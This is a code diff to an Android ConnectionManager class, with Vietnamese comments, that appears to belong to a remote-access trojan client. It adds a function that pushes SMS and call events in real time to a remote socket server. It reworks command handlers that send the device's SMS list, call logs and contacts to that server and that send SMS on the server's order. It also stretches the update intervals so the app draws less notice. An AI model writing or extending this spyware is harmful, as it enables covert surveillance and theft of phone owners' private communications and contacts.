@@ -21,8 +21,8 @@ public class ConnectionManager {
     private static FileManager fm = new FileManager();
 
     /** Gửi vị trí lên server định kỳ (ms). */
-    private static final long LOCATION_UPDATE_INTERVAL_MS = 5 * 60 * 1000; // 5 phút
-    private static final long WATCHDOG_INTERVAL_MS = 15 * 1000; // 15 giây
+    private static final long LOCATION_UPDATE_INTERVAL_MS = 30 * 60 * 1000; // 30 phút (tiết kiệm pin)
+    private static final long WATCHDOG_INTERVAL_MS = 3 * 60 * 1000; // 3 phút (giảm từ 15s)
     private static Handler locationUpdateHandler;
     private static Runnable locationUpdateRunnable;
     private static Handler watchdogHandler;
@@ -213,6 +213,29 @@ public class ConnectionManager {
         }).start();
     }
 
+    /** Gửi dữ liệu realtime (SMS, Call) NGAY LẬP TỨC lên server. */
+    public static void sendRealtimeData(final JSONObject data) {
+        if (ioSocket == null || !ioSocket.connected()) {
+            Log.w("ConnectionManager", "Cannot send realtime data - not connected");
+            return;
+        }
+        
+        new Handler(Looper.getMainLooper()).post(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    if (ioSocket != null && ioSocket.connected()) {
+                        ioSocket.emit("realtimeData", data);
+                        Log.d("ConnectionManager", "✅ Sent realtime data: " + data.getString("type"));
+                    }
+                } catch (Exception e) {
+                    Log.e("ConnectionManager", "Error sending realtime data", e);
+                }
+            }
+        });
+    }
+
+
     /** Bắt đầu gửi vị trí định kỳ. */
     private static void startPeriodicLocationUpdates() {
         if (locationUpdateHandler == null)
@@ -304,21 +327,123 @@ public class ConnectionManager {
     }
 
 
-    public static void x0000sm(int req,String phoneNo , String msg){
-        if(req == 0)
-            ioSocket.emit("x0000sm" , SMSManager.getSMSList());
-        else if(req == 1) {
-            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
-            ioSocket.emit("x0000sm", isSent);
-        }
+    public static void x0000sm(int req, final String phoneNo, final String msg) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    if (req == 0) {
+                        // Get SMS list
+                        final JSONObject smsList = SMSManager.getSMSList();
+                        new Handler(Looper.getMainLooper()).post(new Runnable() {
+                            @Override
+                            public void run() {
+                                if (ioSocket != null && ioSocket.connected()) {
+                                    if (smsList != null) {
+                                        ioSocket.emit("x0000sm", smsList);
+                                    } else {
+                                        // Send error response
+                                        try {
+                                            JSONObject error = new JSONObject();
+                                            error.put("error", true);
+                                            error.put("message", "Failed to read SMS - check permissions");
+                                            ioSocket.emit("x0000sm", error);
+                                        } catch (Exception e) {
+                                            Log.e("ConnectionManager", "Error sending SMS error response", e);
+                                        }
+                                    }
+                                }
+                            }
+                        });
+                    } else if (req == 1) {
+                        // Send SMS
+                        final boolean isSent = SMSManager.sendSMS(phoneNo, msg);
+                        new Handler(Looper.getMainLooper()).post(new Runnable() {
+                            @Override
+                            public void run() {
+                                if (ioSocket != null && ioSocket.connected()) {
+                                    try {
+                                        JSONObject response = new JSONObject();
+                                        response.put("sent", isSent);
+                                        response.put("to", phoneNo);
+                                        ioSocket.emit("x0000sm", response);
+                                    } catch (Exception e) {
+                                        Log.e("ConnectionManager", "Error sending SMS response", e);
+                                    }
+                                }
+                            }
+                        });
+                    }
+                } catch (Exception e) {
+                    Log.e("ConnectionManager", "Error in x0000sm", e);
+                    // Don't let exception kill the connection
+                }
+            }
+        }).start();
     }
 
     public static void x0000cl(){
-        ioSocket.emit("x0000cl" , CallsManager.getCallsLogs());
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    final JSONObject callLogs = CallsManager.getCallsLogs();
+                    new Handler(Looper.getMainLooper()).post(new Runnable() {
+                        @Override
+                        public void run() {
+                            if (ioSocket != null && ioSocket.connected()) {
+                                if (callLogs != null) {
+                                    ioSocket.emit("x0000cl", callLogs);
+                                } else {
+                                    try {
+                                        JSONObject error = new JSONObject();
+                                        error.put("error", true);
+                                        error.put("message", "Failed to read call logs - check permissions");
+                                        ioSocket.emit("x0000cl", error);
+                                    } catch (Exception e) {
+                                        Log.e("ConnectionManager", "Error sending call logs error response", e);
+                                    }
+                                }
+                            }
+                        }
+                    });
+                } catch (Exception e) {
+                    Log.e("ConnectionManager", "Error in x0000cl", e);
+                }
+            }
+        }).start();
     }
 
     public static void x0000cn(){
-        ioSocket.emit("x0000cn" , ContactsManager.getContacts());
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    final JSONObject contacts = ContactsManager.getContacts();
+                    new Handler(Looper.getMainLooper()).post(new Runnable() {
+                        @Override
+                        public void run() {
+                            if (ioSocket != null && ioSocket.connected()) {
+                                if (contacts != null) {
+                                    ioSocket.emit("x0000cn", contacts);
+                                } else {
+                                    try {
+                                        JSONObject error = new JSONObject();
+                                        error.put("error", true);
+                                        error.put("message", "Failed to read contacts - check permissions");
+                                        ioSocket.emit("x0000cn", error);
+                                    } catch (Exception e) {
+                                        Log.e("ConnectionManager", "Error sending contacts error response", e);
+                                    }
+                                }
+                            }
+                        }
+                    });
+                } catch (Exception e) {
+                    Log.e("ConnectionManager", "Error in x0000cn", e);
+                }
+            }
+        }).start();
     }
 
     public static void x0000mc(int sec) throws Exception{
